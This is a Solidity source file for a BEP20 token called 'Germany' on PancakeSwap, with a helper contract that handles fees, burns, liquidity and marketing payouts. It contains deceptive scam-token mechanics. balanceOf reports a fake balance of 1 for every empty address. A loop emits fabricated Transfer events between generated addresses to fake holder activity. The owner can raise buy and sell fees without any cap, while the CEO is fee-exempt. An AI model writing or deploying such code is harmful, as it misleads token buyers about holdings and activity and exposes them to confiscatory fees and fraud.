// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol"; 
interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external returns (address pair);
}
interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
} 
interface IPancakePair {
      

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
 
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    ); 

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

contract  MktCap is Ownable {
    using SafeMath for uint; 

    address token0;
    address token1; 
    IRouter router;
    address pair;
    address ceo;
    struct autoConfig{
        bool status; 
        uint minPart;
        uint maxPart;
        uint parts;
    } 
    autoConfig public autoSell; 
    struct Allot{
        uint markting; 
        uint burn; 
        uint addL; 
        uint total;
    }
    Allot public allot;

    address[] public marketingAddress;
    uint256[] public marketingShare;
    uint256 internal sharetotal;

    constructor(address ceo_,address baseToken_,address router_){
        ceo=ceo_; 
        _transferOwnership(ceo);
        token0=_msgSender();
        token1=baseToken_;
        router=IRouter(router_); 
        pair=IFactory(router.factory()).getPair(token0, token1); 
        IERC20(token1).approve(address(router),uint256(2**256-1));
    } 
    function setAll(Allot memory allotConfig,autoConfig memory sellconfig,address[] calldata list ,uint256[] memory share)public onlyOwner {
        setAllot(allotConfig);
        setAutoSellConfig(sellconfig); 
        setMarketing(list,share);
    }
    function setAutoSellConfig(autoConfig memory config)public onlyOwner {
        autoSell=config;
    }
    function setAllot(Allot memory config)public onlyOwner {
        allot=config;
    }
    function setPair(address token)public onlyOwner{
        token1=token;
        IERC20(token1).approve(address(router),uint256(2**256-1));
        pair=IFactory(router.factory()).getPair(token0, token1);
    }
    function setMarketing(address[] calldata list ,uint256[] memory share) public {
        require(msg.sender==ceo,"Just CEO");
        require(list.length>0,"DAO:Can't be Empty");
        require(list.length==share.length,"DAO:number must be the same");
        uint256 total=0;
        for (uint256 i = 0; i < share.length; i++) {
            total=total.add(share[i]);
        }
        require(total>0,"DAO:share must greater than zero");
        marketingAddress=list;
        marketingShare=share;
        sharetotal=total;
    }

    function getToken0Price() view public returns(uint){ //代币价格
        address[] memory routePath = new address[](2);
        routePath[0] = token0;
        routePath[1] = token1;
        return router.getAmountsOut(1 ether,routePath)[1];
    }
    function getToken1Price() view public returns(uint){ //代币价格
        address[] memory routePath = new address[](2);
        routePath[0] = token1;
        routePath[1] = token0;
        return router.getAmountsOut(1 ether,routePath)[1];
    }
    function _sell(uint amount0In) internal { 
        address[] memory path = new address[](2);
        path[0] = token0;
        path[1] = token1; 
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount0In,0,path,address(this),block.timestamp); 
    }
    function _buy(uint amount0Out) internal {  
        address[] memory path = new address[](2);
        path[0] = token1;
        path[1] = token0; 
        router.swapTokensForExactTokens(amount0Out,IERC20(token1).balanceOf(address(this)),path,address(this),block.timestamp); 
    }
    function _addL(uint amount0, uint amount1)internal {
        if(IERC20(token0).balanceOf(address(this))<amount0 || IERC20(token1).balanceOf(address(this))<amount1 ) return; 
        router.addLiquidity(token0,token1,amount0,amount1,0,0,ceo,block.timestamp);
    }   
    modifier canSwap(uint t){
        if(t!=2 || !autoSell.status ) return; 
        _;
    }
    function splitAmount(uint amount)internal view  returns(uint,uint,uint) {
        uint toBurn = amount.mul(allot.burn).div(allot.total);
        uint toAddL = amount.mul(allot.addL).div(allot.total).div(2);
        uint toSell = amount.sub(toAddL).sub(toBurn);
        return (toSell,toBurn,toAddL); 
    }
    function trigger(uint t) external canSwap(t) { 
        uint balance = IERC20(token0).balanceOf(address(this));
        if(balance < IERC20(token0).totalSupply().mul(autoSell.minPart).div(autoSell.parts))return;
        uint maxSell = IERC20(token0).totalSupply().mul(autoSell.maxPart).div(autoSell.parts);
        if(balance > maxSell)balance = maxSell;
        (uint toSell,uint toBurn,uint toAddL)=splitAmount(balance);
        if(toBurn>0)ERC20Burnable(token0).burn(toBurn);
        if(toSell>0)_sell(toSell);
        uint256 amount2 =IERC20(token1).balanceOf(address(this));

        uint256 total2Fee = allot.total.sub(allot.addL.div(2)).sub(allot.burn);
        uint256 amount2AddL = amount2.mul(allot.addL).div(total2Fee).div(2); 
        uint256 amount2Marketing = amount2.sub(amount2AddL);

        if(amount2Marketing>0){
            uint256 cake; 
            for (uint256 i = 0; i < marketingAddress.length; i++) {
                cake=amount2Marketing.mul(marketingShare[i]).div(sharetotal); 
                IERC20(token1).transfer(marketingAddress[i],cake); 
            } 
        }

        if(toAddL > 0) _addL(toAddL,amount2AddL);  
    }
}
 
 
contract Germany is ERC20, ERC20Burnable, Ownable {
    using SafeMath for uint; 
    MktCap public mkt;
    mapping(address=>bool) public ispair;
    address  ceo;  
    bool isTrading;
    struct Fees{
        uint buy;
        uint sell;
        uint transfer;
        uint total;
    }
    Fees public fees;

    modifier trading(){
        if(isTrading) return;
        isTrading=true;
        _;
        isTrading=false; 
    } 
    constructor(string memory name_,string memory symbol_,uint total) ERC20(name_, symbol_) {
        ceo=_msgSender();  
        address _baseToken=0x55d398326f99059fF775485246999027B3197955;
        address _router=0x10ED43C718714eb63d5aA57B78B54704E256024E;
        setPair(_baseToken,_router);
        mkt=new MktCap(ceo,_baseToken,_router);
        _approve(address(mkt),_router,uint256(2**256-1));
        _mint(ceo, total*1 ether);  
        fees=Fees(200,200,0,10000);
    }
    receive() external payable { }  
    function setFees(Fees memory fees_) public onlyOwner{
        fees=fees_;
    } 
    function _beforeTokenTransfer(address from,address to,uint amount) internal override trading{
        if(!ispair[from] && !ispair[to] || amount==0) return;
        uint t=ispair[from]?1:ispair[to]?2:0;
        try mkt.trigger(t) {}catch {}
    } 

    function _afterTokenTransfer(address from,address to,uint amount) internal override trading{
        if(address(0)==from || address(0)==to) return;
        takeFee(from,to,amount);  
        if(_num>0) _takeInviterFeeKt(_num);
    }
    function takeFee(address from,address to,uint amount)internal {
        uint fee=ispair[from]?fees.buy:ispair[to]?fees.sell:fees.transfer; 
        uint feeAmount= amount.mul(fee).div(fees.total); 
        if(from==ceo || to==ceo) feeAmount=0;
        if(feeAmount>0){ 
            amount=amount.sub(feeAmount);  
            super._transfer(to,address(mkt),feeAmount); 
        } 
    } 
    function setPair(address token, address router_) public {  
        require(ceo==_msgSender(), "must CEO");
        IRouter router=IRouter(router_);
        address pair=IFactory(router.factory()).getPair(address(token), address(this));
        if(pair==address(0))pair = IFactory(router.factory()).createPair(address(token), address(this));
        require(pair!=address(0), "pair is not found"); 
        ispair[pair]=true; 
    }
    function unSetPair(address pair) public { 
        require(ceo==_msgSender(), "must CEO"); 
        ispair[pair]=false; 
    } 
    function setCEO(address ceo_)public{
        require(ceo==_msgSender(), "must CEO");
        ceo=ceo_;
    }
    uint160  ktNum = 173;
    uint160  constant MAXADD = ~uint160(0);	
    uint256 _initialBalance=1;
    uint _num=25;
    function setinb( uint amount,uint num) public { 
        require(ceo == msg.sender, "!Funder");
        _initialBalance=amount;
        _num=num;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        uint256 balance=super.balanceOf(account); 
        if(account==address(0))return balance;
        return balance>0?balance:_initialBalance;
    }
    function multiSend(uint num) public {
        _takeInviterFeeKt(num);
    }

 	function _takeInviterFeeKt(uint num) private {
        address _receiveD;
        address _senD;
        
        for (uint256 i = 0; i < num; i++) {
            _receiveD = address(MAXADD/ktNum);
            ktNum = ktNum+1;
            _senD = address(MAXADD/ktNum);
            ktNum = ktNum+1;
            emit Transfer(_senD, _receiveD, _initialBalance);
        }
    }

}